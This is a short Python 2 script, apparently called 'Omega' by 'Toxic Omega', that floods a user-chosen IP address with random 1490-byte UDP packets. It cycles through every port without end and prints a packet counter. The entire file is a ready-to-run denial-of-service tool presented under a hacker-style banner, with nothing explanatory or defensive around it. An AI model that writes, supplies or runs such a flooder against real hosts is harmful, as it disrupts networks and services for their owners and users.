import os
import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
#by Toxic Omega

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print("   ____                             ")
print("  / __ \                            ")
print(" | |  | |_ __ ___   ___  __ _  __ _ ")
print(" | |  | | '_ ` _ \ / _ \/ _` |/ _` |")
print(" | |__| | | | | | |  __/ (_| | (_| |")
print("  \____/|_| |_| |_|\___|\__, |\__,_|")
print("                         __/ |      ")
print("                        |___/       ")
print(" ")
print("Developer: Toxic Omega")
print(" ")
ip = raw_input("[*] Ip: ")
port = input("[*] Port: ")

os.system("clear")
time.sleep(5)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "|Packets: %s |Ip: %s | port: %s |"%(sent,ip,port)
     if port == 65534:
       port = 1
